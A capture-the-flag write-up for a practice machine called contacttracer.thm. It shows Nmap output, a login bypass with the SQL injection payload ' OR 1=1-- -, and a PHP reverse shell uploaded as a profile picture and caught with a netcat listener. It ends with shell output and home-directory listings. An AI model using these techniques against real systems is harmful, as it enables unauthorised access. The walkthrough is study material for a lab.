![image](https://user-images.githubusercontent.com/63084488/135784017-2f2ff112-07cb-48a2-bc8d-00ac87d08961.png)


```bash
Nmap scan report for 10.10.235.17
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2021-10-04 06:17:54 +04 for 27s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 27:1d:c5:8a:0b:bc:02:c0:f0:f1:f5:5a:d1:ff:a4:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA1Xdw3dCrCjetmQieza7pYcBp1ceBvVB6g1A/OU+bqoRSEfnKTHP0k5P2U1BbeciJTqflslP3IHh+py4jkWTkzbU80Mxokn2Kr5Qa5GKgrme4Q6GfQsQeeFpbLlIHs+eEBnCLY/J03iddkt6eukd3VwZuRXHnEHl7G6Y1f0IEEzProg15iAtUTbS8OwPx+ZwdvXfJTWujUS+OzLLjQw5wPewCEK+TJHVM02H+5sO+dYBMC9rgiEnPe5ayP+nupAXMNYB9/p/gO3nj5h33SokY3RkXMFsijUJpoBnsDHNgo2Q41j9AB4txabzUQVFql30WO8l8azO4y/fWYYtU8YCn
|   256 ce:f7:60:29:52:4f:65:b1:20:02:0a:2d:07:40:fd:bf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjTYytQsU83icaN6V9H1Kotl0nKVpR35o6PtyrWy9WjljhWaNr3cnGDUnd7RSIUOiZco3UL5+YC31sBdVy6b6o=
|   256 a5:b5:5a:40:13:b0:0f:b6:5a:5f:21:60:71:6f:45:2e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHVz0M8zYIXcw2caiAlNCr01ycEatz/QPx1PpgMZqZN
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Coronavirus Contact Tracer
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.39 - 3.2 (86%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=10/4%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=615A646D%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10E%TI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%TG=40%W=F507%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 40.455 days (since Tue Aug 24 19:23:17 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   167.40 ms 10.8.0.1
2   224.38 ms 10.10.235.17

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:18
Completed NSE at 06:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.28 seconds
           Raw packets sent: 85 (7.328KB) | Rcvd: 46 (11.520KB)
```
When trying to visit the port 80 we get a host name contracttracer.thm. 
![image](https://user-images.githubusercontent.com/63084488/135784418-2af0b174-6f3e-4c8f-9ae0-d3793c0268be.png)

add it to /etc/hosts file.

we get 
![image](https://user-images.githubusercontent.com/63084488/135784606-ba6a37d4-7fae-4800-b082-ed7515bd7f15.png)

admin panel.
![image](https://user-images.githubusercontent.com/63084488/135784797-f8fc1423-42de-4868-a7f2-6fa0b284e089.png)

using some basic sql injections `' OR 1=1-- -` on the login page and we are able to login.
![image](https://user-images.githubusercontent.com/63084488/135785135-432cb9a3-d645-46a4-a1dc-5bd733ebdbed.png)

after looking through the site we can see there is chance to update the profile picture. so lets try to upload php reverse shell.
then try loging out and log back in to load the profile picture.
this will give us the shell.

set up a listerner using netcat on port 9001

```bash
Connection received on 10.10.235.17 46208
Linux lockdown 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 02:51:20 up 38 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: cannot set terminal process group (1027): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ 
```

we can see too users on home directory . But we dont have the premission inside the directory.
```bash
cd /home
sh-4.4$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 May 10 23:47 .
drwxr-xr-x 24 root   root   4096 Jul 23 15:23 ..
drwxr-x---  6 cyrus  cyrus  4096 Jul 30 10:50 cyrus
drwxr-x---  5 maxine maxine 4096 May 11 04:25 maxine
sh-4.4$ cd cyrus
cd cyrus
sh: cd: cyrus: Permission denied
sh-4.4$ cd maxine
cd maxine
sh: cd: maxine: Permission denied
sh-4.4$ 
```


